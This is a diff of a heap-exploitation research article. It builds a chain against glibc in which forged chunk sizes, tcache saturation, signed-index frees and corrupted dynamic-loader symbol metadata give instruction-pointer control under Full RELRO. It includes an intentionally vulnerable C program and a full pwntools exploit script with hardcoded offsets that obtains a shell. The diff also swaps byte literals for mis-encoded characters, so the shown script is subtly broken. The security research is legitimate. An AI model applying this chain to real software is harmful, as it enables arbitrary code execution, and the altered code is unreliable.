@@ -4,20 +4,19 @@
 
 Modern heap hardening mechanisms — including **tcache**, allocator-level **size restrictions**, and **Full RELRO** — are commonly assumed to drastically reduce the exploitability of heap-based vulnerabilities, particularly in the absence of memory disclosure primitives.
 
-This paper demonstrates that this assumption is **incomplete**.
+This paper demonstrates that this assumption is **fundamentally incomplete**.
 
-We present a detailed, end-to-end exploitation chain that derives a **precise, byte-wise relative write primitive** from a constrained heap vulnerability, bypasses allocator-enforced size limits, **corrupts tcache metadata itself**, and escalates into **dynamic loader metadata corruption**, resulting in **arbitrary code execution under Full RELRO**, **without GOT**, **without PLT**, and **without absolute address disclosure**.
+We present a fully detailed, end-to-end exploitation chain that derives a **precise, byte-wise relative write primitive** from a constrained heap vulnerability, bypasses allocator-enforced size limits, **corrupts tcache metadata itself**, and escalates into **dynamic loader metadata corruption**, resulting in **arbitrary code execution under Full RELRO**, **without GOT**, **without PLT**, and **without absolute address disclosure**.
 
-Rather than relying on a single vulnerability, this work focuses on the **composition of weak primitives across subsystems**: heap metadata corruption, tcache trust violations, pointer confusion, and loader metadata abuse.
+Rather than relying on a single powerful bug, this work focuses on the **composition of weak primitives across subsystems**: heap metadata corruption, tcache trust violations, pointer confusion, and dynamic loader metadata abuse. The result is not a fragile exploit, but a **general exploitation methodology** applicable to modern post-mitigation environments.
 
 ---
 
 ## Scope & Assumptions
 
-This exploit chain is demonstrated against a specific glibc and dynamic loader configuration.
-Certain properties (relative DSO layout, writable loader mappings) are **empirical rather than ABI-guaranteed**.
+This exploitation chain is demonstrated against a specific glibc allocator and dynamic loader configuration. Certain properties — such as relative DSO layout and the presence of writable loader mappings — are **empirical rather than ABI-guaranteed**.
 
-The objective is not universal exploit reliability, but to show that **modern hardening does not eliminate cross-subsystem composition attacks** when implicit trust boundaries remain.
+The objective is not universal exploit reliability across all systems, but to demonstrate that **modern hardening does not eliminate cross-subsystem composition attacks** when implicit trust boundaries remain intact.
 
 ---
 
@@ -25,36 +24,38 @@ The objective is not universal exploit reliability, but to show that **modern ha
 
 The attacker has:
 
-- A **heap-based out-of-bounds write**
-    - byte-granular
-    - forward-only
-    - relative to a valid allocation
-- A **signed index confusion** allowing unintended `free()` targets
-- **No arbitrary memory read**
-- **No absolute address disclosure**
-- Full modern mitigations enabled
+* A **heap-based out-of-bounds write**
+
+    * byte-granular
+    * forward-only
+    * relative to a valid allocation
+* A **signed index confusion** allowing unintended `free()` targets
+* **No arbitrary memory read**
+* **No absolute address disclosure**
+* All standard modern mitigations enabled (ASLR, NX, PIE, Full RELRO)
 
 The attacker cannot:
 
-- leak libc or heap bases directly
-- overwrite function pointers directly
-- invoke PLT/GOT-based resolution
+* leak libc or heap base addresses directly
+* overwrite function pointers directly
+* invoke PLT- or GOT-based resolution paths
 
-This threat model reflects realistic post-mitigation exploitation scenarios and explicitly forbids classic shortcuts.
+This threat model reflects realistic post-mitigation exploitation scenarios and explicitly forbids classic shortcuts commonly relied upon in historical heap exploits.
 
 ---
 
 ## 2. High-Level Invariant
 
-> **Invariant:** If attacker-controlled data is interpreted as trusted allocator or loader metadata, control-flow integrity is lost.
+> **Invariant — Cross-Subsystem Trust Invariant**
+> If attacker-controlled data is interpreted as trusted allocator or loader metadata, control-flow integrity is lost.
 
-This invariant recurs across subsystems:
+This invariant recurs across subsystems that are typically analyzed in isolation:
 
-- Heap chunk metadata (`size` field)
-- Tcache freelist management
-- Dynamic loader metadata (`DT_SYMTAB`, `Elf64_Sym`)
+* Heap chunk metadata (`size` field semantics)
+* Tcache freelist management and saturation logic
+* Dynamic loader metadata (`DT_SYMTAB`, `Elf64_Sym` resolution)
 
-The exploit demonstrates how violating allocator invariants enables violating loader invariants, even though these subsystems are typically reasoned about independently.
+This exploit demonstrates that **violating allocator invariants enables violating loader invariants**, even though these components belong to distinct layers of the runtime.
 
 ---
 
@@ -80,9 +81,13 @@ ELF symbol forgery
 RIP control
 ```
 
+Each step preserves allocator and loader *structural validity* while progressively expanding attacker influence across trust boundaries.
+
 ---
 
-## 4. Vulnerable Program (Full Source)
+## 4. Vulnerable Program
+
+The following program intentionally models two weak but realistic bugs: a forward-only byte-wise heap overflow and a signed index confusion during `free()`.
 
 ```c
 #include <stdio.h>
@@ -159,36 +164,32 @@ int main(void) {
 
 ---
 
-## 5. Primitive #1 — Byte-wise Forward OOB Write
+## 5. Primitive #1 — Byte-wise Forward Heap Write
 
-The `edit()` function allows a single-byte write at an arbitrary positive offset from a valid heap chunk.
+The `edit()` function permits a single-byte write at an attacker-controlled positive offset from a valid heap allocation.
 
 Properties:
 
-- Single-byte precision
-- Relative addressing
-- Forward-only reach
-- No direct control-flow overwrite
+* byte-level precision
+* relative addressing
+* forward-only reach
+* no direct control-flow overwrite
 
-On its own, this primitive is insufficient for exploitation.
+In isolation, this primitive is insufficient to hijack execution. Its power emerges only through **systematic invariant violation**.
 
 ---
 
 ## 6. Forging Heap Chunk Sizes
 
-### Heap Layout
+Eight chunks of size `0x30` are allocated contiguously. Using the forward OOB primitive, adjacent chunk size fields are modified.
 
-Eight chunks of size `0x30` are allocated contiguously, enabling forward corruption of adjacent chunk metadata.
+Encoding a size value of `0x291` yields:
 
-### Size Encoding
+* a usable chunk size of `0x290`
+* correct alignment
+* `prev_inuse = 1`
 
-Setting `size = 0x291` yields:
-
-- usable size `0x290`
-- valid alignment
-- `prev_inuse = 1`
-
-glibc does **not validate the provenance** of size fields during `free()`.
+glibc does **not validate the provenance** of size fields during `free()`, only their internal consistency.
 
 ![fake-sizes](https://lowlevel.re/uploads/1769764729102.png)
 
@@ -196,13 +197,13 @@ glibc does **not validate the provenance** of size fields during `free()`.
 
 ## 7. Tcache Saturation and Semantic Pivot
 
-Seven forged frees saturate `tcache[0x290]`.
+Seven forged frees saturate `tcache[0x290]`. Once saturated:
 
-Once saturated:
+* further frees bypass tcache
+* the allocator transitions to unsorted bin handling
+* allocation-time size restrictions are no longer relevant
 
-- further frees bypass tcache
-- allocator transitions to unsorted bin handling
-- allocation-time size restrictions become irrelevant
+This represents a **semantic pivot**: allocator behavior changes without violating allocator invariants.
 
 ![tcache-full](https://lowlevel.re/uploads/1769764980711.png)
 
@@ -210,9 +211,9 @@ Once saturated:
 
 ## 8. Primitive #2 — Signed Index Confusion
 
-Negative indices passed to `destroy()` allow freeing unintended pointers derived from heap memory.
+Negative indices passed to `destroy()` cause unintended pointers derived from heap memory to be freed.
 
-glibc accepts these pointers as valid chunks, modeling common real-world sign and bounds errors.
+glibc accepts these pointers as valid chunk addresses, modeling a common class of real-world sign and bounds bugs.
 
 ---
 
@@ -228,70 +229,74 @@ With tcache saturated, freeing overlapping pointers causes **tcache metadata its
 
 ## 10. Deriving a libc-Relative Write Primitive
 
-Subsequent allocations return memory backed by libc arena structures.
-
-Combined with the original OOB write, this yields a **precise, byte-wise, forward relative write anchored in libc**.
+Subsequent allocations return memory backed by libc arena structures. Combined with the original byte-wise OOB write, this yields a **precise, byte-granular, forward relative write primitive anchored in libc memory**.
 
 ![libc-in-heap](https://lowlevel.re/uploads/1769764735179.png)
+
+At this stage, the attacker gains influence over libc state without any address disclosure.
 
 ---
 
 ## 11. Transition to Loader Metadata
 
-From the libc anchor, writable loader mappings are reached via relative offsets.
+From the libc anchor, writable loader mappings are reachable via relative offsets. Targeted structures include:
 
-Targets include:
+* `DT_SYMTAB` pointers inside `struct link_map`
+* concrete `Elf64_Sym` entries of already-loaded DSOs
 
-- `DT_SYMTAB` pointers inside `struct link_map`
-- concrete `Elf64_Sym` entries of already-loaded DSOs
-
-This transition leverages runtime loader resolution semantics, discussed in more detail in [ret2dso](https://lowlevel.re/article/ret2dso-runtime-ret2dlresolve-under-full-relro).
+This transition exploits **runtime loader resolution semantics**, described in detail in the companion work *ret2dso*.
 
 ---
 
 ## 12. ELF Symbol Forgery
 
-During runtime resolution:
+During runtime resolution, the loader computes:
 
 ```
 resolved = sym->st_value + l_addr
 ```
 
-Only `st_value` influences control flow.
-All other fields may be reused from a legitimate symbol entry.
+Only `st_value` influences control flow. All other fields may be reused from an existing legitimate symbol entry, preserving structural consistency.
 
 ---
 
 ## 13. Runtime Resolution Trigger
 
-A single-byte corruption in the `stdin` `FILE` structure redirects execution into a libc code path performing runtime symbol resolution.
+A single-byte corruption inside the `stdin` `FILE` structure redirects execution into a libc path that performs runtime symbol resolution.
 
-This yields direct control of RIP under Full RELRO.
+Because loader metadata has already been corrupted, this resolution yields **direct control of RIP under Full RELRO**.
 
 ---
 
 ## 14. Address Discovery Strategy
 
-Relative drift between libc and ld.so is **empirical, not guaranteed**, but sufficiently constrained in practice to permit retry-based exploitation.
+Relative drift between libc and `ld.so` is **empirical rather than guaranteed**, but sufficiently constrained in practice to permit retry-based exploitation.
+
+Importantly, this technique relies on **reachability rather than predictability**: no fixed offsets or brute force of address space are required.
 
 ---
 
 ## 15. Full Exploit
 
+The following exploit implements the complete chain described above. It is intentionally verbose and structured to mirror the conceptual phases, making the correspondence between theory and practice explicit.
+
 ```python
 from pwn import *
 
 context.binary = elf = ELF("heap-to-loader")
+context.log_level = "info"
 
 found = False
 attempt = 1
+
 while not found:
     try:
         log.info(f"Attempt: {attempt}")
         io = process("heap-to-loader")
 
-        # --- Heap interaction primitives ---
-
+        # -------------------------------------------------
+        # Heap interaction primitives
+        # -------------------------------------------------
         def heap_alloc(slot, size, data=b"A"):
             io.sendline(b"1")
             io.sendline(str(slot).encode())
@@ -308,47 +313,52 @@ while not found:
             io.sendline(b"3")
             io.sendline(str(slot).encode())
 
-        # --- Derived arbitrary relative write ---
+        # -------------------------------------------------
+        # Derived libc-relative write primitive
+        # -------------------------------------------------
         def libc_relative_write(anchor_slot, relative_offset, payload: bytes):
             for i, b in enumerate(payload):
-                heap_byte_write(
-                    anchor_slot,
-                    relative_offset + i,
-                    f"{b:02x}".encode()
-                )
+                heap_byte_write(anchor_slot, relative_offset + i, f"{b:02x}".encode())
 
-        # === Phase 1: Heap grooming & tcache saturation ===
+        # -------------------------------------------------
+        # Phase 1 — Heap grooming and chunk size forgery
+        # -------------------------------------------------
         for i in range(8):
             heap_alloc(i, 0x30)
 
-        # Forge size fields to 0x291 using forward OOB writes
+        # Forge adjacent chunk size fields to 0x291
         for i in range(7):
             heap_byte_write(0, (i * 0x40) + 0x38, b"91")
             heap_byte_write(0, (i * 0x40) + 0x39, b"02")
 
-        # Fill tcache[0x290]
+        # -------------------------------------------------
+        # Phase 2 — Tcache saturation
+        # -------------------------------------------------
         for i in range(8):
             heap_free(i)
 
-        # === Phase 2: Free overlapping allocator metadata ===
+        # -------------------------------------------------
+        # Phase 3 — Free overlapping allocator metadata
+        # -------------------------------------------------
         heap_free(-4)
 
         # Force unsorted bin allocation
         heap_alloc(0, 0x80, p16(1) * 4)
 
-        # Allocation backed by libc arena
+        # Allocation backed by libc arena structures
         heap_alloc(1, 0x30)
 
-        # === Phase 3: Loader metadata corruption (ret2dso) ===
-
+        # -------------------------------------------------
+        # Phase 4 — Transition to loader metadata (ret2dso)
+        # -------------------------------------------------
         ARENA_TO_STDIN_OFFSET     = -0x240
         STDIN_VTABLE_OFFSET       = 0xd8
-        LINKMAP_SYMTAB_OFFSET    = 0xb60
-        DSO_SYMBOL_OFFSET        = 0x208
-        LD_WRITABLE_BASE_OFFSET  = 0x3a000
+        LINKMAP_SYMTAB_OFFSET     = 0xb60
+        DSO_SYMBOL_OFFSET         = 0x208
+        LD_WRITABLE_BASE_OFFSET   = 0x3a000
 
-        ONE_GADGET_OFFSET        = 0x12ee1a
-        LD_LIBC_DRIFT            = 0x1a8560
+        ONE_GADGET_OFFSET         = 0x12ee1a
+        LD_LIBC_DRIFT             = 0x1a8560
 
         forged_st_value = (
             -(LD_LIBC_DRIFT + ONE_GADGET_OFFSET)
@@ -361,16 +371,16 @@ while not found:
             p64(forged_st_value)            # forged st_value
         )
 
-        # Overwrite DT_SYMTAB pointer
+        # Redirect DT_SYMTAB inside loader metadata
         target = (
             ARENA_TO_STDIN_OFFSET
             + LD_LIBC_DRIFT
             + LD_WRITABLE_BASE_OFFSET
             + LINKMAP_SYMTAB_OFFSET
         )
-        libc_relative_write(1, target, b"\xf0")
+        libc_relative_write(1, target, b"ð")
 
-        # Overwrite concrete Elf64_Sym entry
+        # Overwrite a concrete Elf64_Sym entry
         target = (
             ARENA_TO_STDIN_OFFSET
             + LD_LIBC_DRIFT
@@ -379,9 +389,11 @@ while not found:
         )
         libc_relative_write(1, target, forged_symbol)
 
-        # Trigger runtime resolution via FILE corruption
+        # -------------------------------------------------
+        # Phase 5 — Trigger runtime resolution via FILE corruption
+        # -------------------------------------------------
         target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
-        libc_relative_write(1, target, b"\xff")
+        libc_relative_write(1, target, b"ÿ")
 
         io.sendline(b"id")
         if b"uid" in io.clean():
@@ -391,16 +403,19 @@ while not found:
     except Exception:
         io.close()
         attempt += 1
-```
 
-![final](https://lowlevel.re/uploads/1769764740945.png)
+```
 
 ---
 
 ## 16. Conclusion
 
-Modern mitigations increasingly harden individual subsystems, but exploitation remains possible where **trust assumptions cross subsystem boundaries**.
+Modern mitigations increasingly harden individual subsystems in isolation. This work demonstrates that exploitation remains viable where **implicit trust assumptions cross subsystem boundaries**.
 
-As long as allocator, libc, and loader metadata remain mutually trusted, **weak primitives can still be composed into full control-flow compromise**, even under Full RELRO and without memory disclosure.
+As long as allocator, libc, and loader metadata remain mutually trusted, **weak primitives can be systematically composed into full control-flow compromise**, even under Full RELRO and without memory disclosure.
 
-Web article at: https://lowlevel.re/article/composing-weak-heap-primitives
+Source code & environment setup: https://github.com/retleave/pocs
+
+---
+
+*This document is intended for defensive research and educational purposes.*
